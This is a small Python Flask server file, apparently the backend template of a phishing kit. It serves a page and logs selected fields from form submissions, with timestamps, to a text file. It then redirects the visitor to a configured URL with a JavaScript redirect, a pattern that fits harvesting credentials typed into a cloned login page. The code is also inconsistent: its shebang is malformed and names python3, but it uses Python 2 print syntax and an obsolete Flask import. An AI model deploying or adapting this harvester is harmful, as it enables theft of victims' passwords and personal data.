#!/usr/bin/env/python3
# -*- coding: utf-8 -*-

# imports
import time

from flask import Flask
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask.ext.script import Manager

# app
app = Flask(__name__)
manager = Manager(app)

# log file
LOG_FILE = 'log.txt'
TO_LOG = __TO_LOG__
REDIRECT_URL = '__REDIRECT_URL__'

# form function
@app.route('/form', methods=['POST'])
def form():
    with open(LOG_FILE, 'a') as f:
        f.write(time.ctime() + '\n')
        for i in TO_LOG:
            if i in request.form:
                log = i + ' = ' + request.form[i]
                f.write(log + '\n')
                print log
        f.write('\n')
    return "<script>window.location='" + REDIRECT_URL + "'</script>"

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    manager.run()